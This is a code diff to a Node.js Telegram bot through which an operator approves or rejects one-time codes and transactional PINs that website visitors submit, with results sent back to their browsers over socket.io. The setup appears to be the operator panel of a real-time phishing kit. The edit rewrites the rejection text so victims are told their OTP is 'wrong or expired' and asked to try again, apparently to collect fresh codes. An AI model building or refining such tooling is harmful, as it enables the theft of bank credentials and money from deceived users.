@@ -100,25 +100,52 @@ bot.on("callback_query", (query) => {
         bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
             chat_id: ADMIN_ID,
             message_id: query.message.message_id,
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [] }
         });
     }
 
     else if (action === "reject") {
         if (step === "4") {
-            io.to(appId).emit('otp-failed', { message: "OTP verification declined by admin." });
+            // Notify frontend AND provide a clear user-facing message so the user knows to retry
+            const userMessage = "The OTP provided is wrong or expired, please try again.";
+            try {
+                io.to(appId).emit('otp-failed', { message: userMessage });
+                console.log(`Emitted otp-failed to ${appId}`);
+            } catch (err) {
+                console.error('Error emitting otp-failed:', err);
+            }
+
+            // Notify admin (callback popup)
             bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
+
+            // Optionally edit admin message and remove inline buttons
+            bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
+                chat_id: ADMIN_ID,
+                message_id: query.message.message_id,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+
         } 
         else if (step === "5") {
-            io.to(appId).emit('pin-failed', { message: "Transactional PIN declined by admin." });
-            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
-        }
+            const userMessage = "The transactional PIN was rejected by an admin. Please try again.";
+            try {
+                io.to(appId).emit('pin-failed', { message: userMessage });
+                console.log(`Emitted pin-failed to ${appId}`);
+            } catch (err) {
+                console.error('Error emitting pin-failed:', err);
+            }
 
-        bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
-            chat_id: ADMIN_ID,
-            message_id: query.message.message_id,
-            parse_mode: 'HTML'
-        });
+            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
+
+            bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
+                chat_id: ADMIN_ID,
+                message_id: query.message.message_id,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+        }
     }
 });
 module.exports = botManager;
